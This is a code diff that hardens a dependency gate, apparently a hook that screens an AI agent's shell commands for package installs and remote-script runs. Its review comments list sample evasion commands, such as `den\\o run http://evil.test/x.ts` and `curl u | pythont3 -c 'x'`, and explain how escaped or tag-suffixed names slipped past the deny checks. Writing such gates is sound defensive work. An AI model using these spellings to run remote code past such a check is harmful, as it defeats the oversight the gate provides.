@@ -962,11 +962,23 @@ _cs_scan(){
       # invoker's argument - so restoring the sentinel and pushing it is the
       # same additive move the escaped-space arm above makes. Additive: the
       # per-run segments are still pushed, so this can only ADD denies.
+      #
+      # [#43 review, F5] ...but only when the splice actually PRODUCED
+      # something new. The first cut fired on every sentinel-bearing token,
+      # so the overwhelmingly common single-run case (`sh -c 'pipx install
+      # evil'`) re-pushed a segment the loop above had already pushed - and
+      # every extra segment is re-expanded at each recursion depth and walked
+      # by the whole gate. Measured ~3.5x on the pre-tool-call hot path for an
+      # invoker with 40 quoted arguments. Comparing against the LAST pushed
+      # segment is one parameter expansion and removes the duplicate, while
+      # the multi-run case that motivated the arm still differs and is kept.
       case "$_tok" in
         *$_CS_WS*)
           _spl="${_tok//$_CS_WS/ }"
           _cs_esc_restore "$_spl"
-          _CS_EXTRA="$_CS_EXTRA$_CS_SEP$_CS_R" ;;
+          if [ "$_CS_R" != "${_CS_EXTRA##*$_CS_SEP}" ]; then
+            _CS_EXTRA="$_CS_EXTRA$_CS_SEP$_CS_R"
+          fi ;;
       esac
       _rem="${_rem#"$_tok"}"
     done
@@ -1110,6 +1122,11 @@ _SHELL_SUBST = {
     # rendering. This replaced RUNNERS_ERE, whose only consumer was the
     # old HEAD's runner arm; runners_regex still feeds this tail.
     "@@INSTALL_TAIL_ERE@@": cmdpos.install_head_tail(),
+    # [#43 review] The words an install tail can END on, derived from the same
+    # tables the tail is built from. A performance guard only - the scan keeps
+    # an unguarded second pass, so an error here costs a slow path, never a
+    # verdict.
+    "@@COMPLETER_CASE@@": _bash_case_words(cmdpos.install_completers()),
     "@@DL_CASE@@": cmdpos.bash_case_alt(cmdpos.DOWNLOADERS, "      "),
     "@@INT_CASE@@": cmdpos.alt(cmdpos.INTERPRETERS),
     # BODY-ONLY on purpose: not in _HEADER_PLACEHOLDERS, so the shared
@@ -2614,6 +2631,22 @@ _xp_key(){{
 # same inversion, and this note used to name it instead. The exemption is
 # gone; the rule is not, because `_xp_stage_kind` still has to answer the same
 # question for the D20 write capture.
+# [issue #41; #43 review F4] THE QUOTE-REMOVAL HALF, AS A FUNCTION. Reference:
+# cmdpos.unquote_word. `_xp_cw` is this plus the basename step; consumers that
+# must keep the path (the install anchor, and the two arrival-channel regexes
+# that read a whole segment) call this one.
+#
+# It is a FUNCTION rather than three inline substitutions because the first cut
+# of #41 inlined them at a new site and shipped a third private copy of the
+# reduction - the D3 shape that same change called out for interpreters. There
+# is now one shell definition, and tests/test_substrate_differential.py drives
+# it against cmdpos.unquote_word.
+_UQW=""
+_uqw(){{
+  local _t="${{1-}}"
+  _t="${{_t//\\'/}}"; _t="${{_t//\\"/}}"; _t="${{_t//\\\\/}}"
+  _UQW="$_t"
+}}
 _XP_CW=""
 _xp_cw(){{
   local _t="${{1-}}"
@@ -2902,23 +2935,40 @@ _xp_stage_kind(){{
     _ib="${{_tok##*/}}"
     case "$_ib" in
       @@INT_CASE@@) ;;
+      # [issue #40] `t`/`d` join the reduction: they are the free-threaded
+      # and debug ABI tags, so `python3.13t` reduces to `python3` exactly as
+      # `python3.12` does. Stripping only digits and dots left the tag glued
+      # on, the reduction never reached a member, and the stage classified
+      # as unmodellable while the trigger (whose suffix DOES admit the tag)
+      # matched - two spellings of one question.
+      #
+      # [#43 review, F1] THE TWO RUNS ARE ORDERED, and the first cut of #40
+      # was not: it stripped `[0-9.td]` in ANY position while INTERP_SUFFIX
+      # admits the tags only AFTER the digits (`[.0-9]*[td]*`). The two
+      # spellings STILL disagreed, just on a different set - `pythont3`
+      # reduced to `python` and matched the trigger NOWHERE, moving the D20
+      # stage from `x` (unmodellable) to `i`, which is the ALLOW direction.
+      # Measured deny -> allow on BOTH substrates for
+      # `curl u | pythont3 -c 'x' ; sh a.sh`: a regression shipped by the
+      # change meant to END this disagreement. Mirroring the regex - tag
+      # run, THEN version run - is what makes it one question.
       *) _iv="$_ib"
          while : ; do
-           case "$_iv" in
-             # [issue #40] `t`/`d` join the class: they are the
-             # free-threaded and debug ABI tags, so `python3.13t` reduces
-             # to `python3` exactly as `python3.12` does. Stripping only
-             # digits and dots left the tag glued on, the reduction never
-             # reached a member, and the stage classified as unmodellable
-             # while the trigger (whose suffix DOES admit the tag) matched
-             # - two spellings of one question, which is the defect this
-             # reduction exists to avoid.
-             *[0-9.td]) _iv="${{_iv%?}}" ;;
-             *) _iv=""; break ;;
-           esac
+           case "$_iv" in *[td]) _iv="${{_iv%?}}" ;; *) break ;; esac
            if [ -z "$_iv" ]; then break; fi
            case "$_iv" in @@INT_CASE@@) break ;; esac
          done
+         case "$_iv" in
+           @@INT_CASE@@) ;;
+           *) while : ; do
+                case "$_iv" in
+                  *[0-9.]) _iv="${{_iv%?}}" ;;
+                  *) _iv=""; break ;;
+                esac
+                if [ -z "$_iv" ]; then break; fi
+                case "$_iv" in @@INT_CASE@@) break ;; esac
+              done ;;
+         esac
          if [ -n "$_iv" ]; then _ib="$_iv"; fi ;;
     esac
     case "$_ib" in
@@ -3441,7 +3491,10 @@ PFX="$CMD_PFX"
 # rendered whole from lib/cmdpos.py (install_head_tail). TOOLS and VERBS
 # used to be literals HERE plus a second set in the SDK's static body: the
 # D3 two-copies shape, and the reason a one-substrate fix could miss.
-# [issue #36] `python[0-9.]* -m` is a transparent COMMAND-POSITION PREFIX
+# [issue #36, spelling updated by #40] The interpreter word followed by
+# `-m` is a transparent COMMAND-POSITION PREFIX. The live spelling is
+# cmdpos.PY_INTERPRETERS + INTERP_SUFFIX, NOT the `python[0-9.]*` this
+# comment used to name - grepping for that literal now finds dead text.
 # inside that tail - the treatment sudo/env/timeout get - so `-m pipx
 # install`, `-m poetry add`, `-m pipenv install` and `-m uv pip install`
 # are re-judged by the arms that already refuse their direct spellings.
@@ -3561,12 +3614,26 @@ is_flag_value(){{
 while IFS= read -r nseg; do
   # [round-4 D20] The two narrow channels, checked per segment so an operator
   # is told which one fired rather than being handed the package-list reason.
-  if [[ "$nseg" =~ $_REMOTE_RUN ]]; then
+  #
+  # [#43 review, F2] BOTH SPELLINGS, because these two are DENY-granting walks
+  # over a whole segment and they read the raw text. The #41 reduction was
+  # applied to the install anchor only, and these sit three lines above it in
+  # the same loop, so the exact class #41 was filed for stayed live here:
+  # `den\\o run http://evil.test/x.ts` was rc=0 on this substrate (SDK deny) -
+  # remote-script EXECUTION, since bash resolves `den\\o` to `deno`. Siblings
+  # measured: `deno ru\\n <url>`, `sudo den\\o run <url>`, `u\\v run --with`,
+  # `uv ru\\n --with`, `uv run --wi\\th`.
+  #
+  # Testing BOTH the raw and the reduced segment is additive - the reduction
+  # only deletes characters, so a raw match cannot be lost - which keeps this
+  # in the deny direction by construction rather than by measurement.
+  _uqw "$nseg"; _useg="$_UQW"
+  if [[ "$nseg" =~ $_REMOTE_RUN ]] || [[ "$_useg" =~ $_REMOTE_RUN ]]; then
     echo "Dependency gate: running a remote script is not verifiable." >&2
     echo "Vendor it, review it, then run it explicitly." >&2
     exit 2
   fi
-  if [[ "$nseg" =~ $_UV_WITH ]]; then
+  if [[ "$nseg" =~ $_UV_WITH ]] || [[ "$_useg" =~ $_UV_WITH ]]; then
     echo "Dependency gate: 'uv run --with' installs a package for the run." >&2
     echo "Approve it in .claude/steering/deps.md and install it explicitly." >&2
     exit 2
@@ -3595,12 +3662,13 @@ while IFS= read -r nseg; do
   # `sudo -u root pip install evil` need them, and cmdpos.py's ARITY section
   # records the 16-of-27 regression an arity table caused. Only the CHOICE
   # of match changes. SDK parity (_install_head_split).
-  set -f
+  # [#43 review, F10] No `set -f` guard here: a QUOTED here-string performs no
+  # pathname expansion and `read -a` never globs, so the guard the sibling
+  # `read -ra TOKS` site carries protects nothing there either - and `set +f`
+  # would re-enable globbing regardless of the caller's state.
   read -ra _NTOKS <<< "$nseg"
-  set +f
   head_txt=""
   rest=""
-  _hfound=0
   _cand=""
   # [issue #41 / X-36e] THE CANDIDATE IS BUILT FROM THE WORD BASH WILL
   # RESOLVE, not from the raw token. bash removes quote characters and
@@ -3614,23 +3682,46 @@ while IFS= read -r nseg; do
   # Only the MATCH reads the reduced word. `rest` keeps the ORIGINAL tokens,
   # so package names are judged exactly as before - the allow-list posture
   # (cmdpos "THE FOLD IS DENY-ONLY") is deliberately untouched here.
+  # [#43 review, F1] THE MATCH IS ATTEMPTED ONLY WHERE IT CAN SUCCEED. The
+  # anchor embeds the prefix run's nested flag/positional quantifiers, so a
+  # FAILING match on a `WRAPPER NAME=VALUE ...` line is already expensive and
+  # running it per token multiplied that. The tail always ENDS on a verb or
+  # runner word, so a match anywhere else cannot succeed. The unguarded
+  # second pass below is the correctness guarantee: an error in the derived
+  # completer list costs a slow path, never a verdict.
   for ((_hi=0; _hi<${{#_NTOKS[@]}}; _hi++)); do
-    _uqw="${{_NTOKS[$_hi]}}"
-    _uqw="${{_uqw//\\'/}}"
-    _uqw="${{_uqw//\\\"/}}"
-    _uqw="${{_uqw//\\\\/}}"
-    if [ -z "$_cand" ]; then _cand="$_uqw"
-    else _cand="$_cand $_uqw"; fi
-    if [[ "$_cand" =~ $HEAD ]]; then
-      head_txt="$_cand"
-      for ((_hj=_hi+1; _hj<${{#_NTOKS[@]}}; _hj++)); do
-        rest="$rest ${{_NTOKS[$_hj]}}"
-      done
-      _hfound=1
-      break
-    fi
+    _uqw "${{_NTOKS[$_hi]}}"
+    if [ -z "$_cand" ]; then _cand="$_UQW"
+    else _cand="$_cand $_UQW"; fi
+    case "${{_UQW##*/}}" in
+      @@COMPLETER_CASE@@)
+        if [[ "$_cand" =~ $HEAD ]]; then
+          head_txt="$_cand"
+          # [#43 review, F9] One expansion, not an append loop that
+          # reallocates per token - and no leading space for the caller.
+          rest="${{_NTOKS[*]:_hi+1}}"
+          break
+        fi ;;
+    esac
   done
-  [ "$_hfound" = "1" ] || continue
+  # `_cand` now holds the whole reduced segment when the guard found nothing,
+  # so ONE match decides whether the guard could have missed anything.
+  if [ -z "$head_txt" ] && [[ "$_cand" =~ $HEAD ]]; then
+    _cand=""
+    for ((_hi=0; _hi<${{#_NTOKS[@]}}; _hi++)); do
+      _uqw "${{_NTOKS[$_hi]}}"
+      if [ -z "$_cand" ]; then _cand="$_UQW"
+      else _cand="$_cand $_UQW"; fi
+      if [[ "$_cand" =~ $HEAD ]]; then
+        head_txt="$_cand"
+        rest="${{_NTOKS[*]:_hi+1}}"
+        break
+      fi
+    done
+  fi
+  # [#43 review, F9] `head_txt` IS the found/not-found signal - the loop only
+  # ever sets it together with `rest` - so the separate sentinel is gone.
+  [ -n "$head_txt" ] || continue
   if [[ "$head_txt" =~ $_IDX_RE ]]; then
     echo "Dependency gate: a package-index override is not verifiable." >&2
     echo "It redirects even an APPROVED package to another server. Remove it," >&2
